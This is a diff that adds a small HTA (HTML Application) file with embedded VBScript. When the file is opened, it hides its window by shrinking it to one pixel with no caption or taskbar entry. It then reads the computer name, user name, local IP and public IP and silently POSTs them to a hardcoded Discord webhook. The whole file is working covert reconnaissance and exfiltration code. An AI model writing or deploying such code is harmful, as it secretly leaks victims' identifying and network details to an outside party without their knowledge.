@@ -1,0 +1,60 @@
+<html>
+<head>
+<HTA:APPLICATION
+    APPLICATIONNAME="MojeHTA"
+    BORDER="none"
+    CAPTION="no"
+    SHOWINTASKBAR="no"
+    SINGLEINSTANCE="yes">
+<script language="VBScript">
+Option Explicit
+
+Dim devName, send, localIP, publicIP, webhookUrl
+
+webhookUrl = "https://discord.com/api/webhooks/1502691866188054793/eX6Dy2Ef0Y8rwqEXYM7_6A4O_CZphvRMk7FBsrsWSOjbl97lbTZ55lTv8o7_aFzfYhe5"
+
+Sub Window_OnLoad
+    window.resizeTo 1,1
+    window.moveTo 0,0
+
+    Dim objNetwork, objWMIService, colItems, objItem, http, jsonBody
+
+    Set objNetwork = CreateObject("WScript.Network")
+    devName = objNetwork.ComputerName & " - " & objNetwork.UserName
+
+    localIP = ""
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    Set colItems = objWMIService.ExecQuery("SELECT IPAddress FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = TRUE")
+    For Each objItem In colItems
+        If Not IsNull(objItem.IPAddress) Then
+            localIP = objItem.IPAddress(0)
+            Exit For
+        End If
+    Next
+
+    publicIP = ""
+    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    http.Open "GET", "https://api.ipify.org", False
+    http.Send
+    publicIP = http.responseText
+
+    send = "local:" & localIP & " - public:" & publicIP
+
+    jsonBody = "{""username"":""" & JsonEscape(devName) & """,""content"":""" & JsonEscape(send) & """}"
+
+    Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    http.Open "POST", webhookUrl, False
+    http.setRequestHeader "Content-Type", "application/json"
+    http.Send jsonBody
+End Sub
+
+Function JsonEscape(s)
+    s = Replace(s, "\", "\\")
+    s = Replace(s, """", "\""")
+    JsonEscape = s
+End Function
+</script>
+</head>
+<body>
+</body>
+</html>
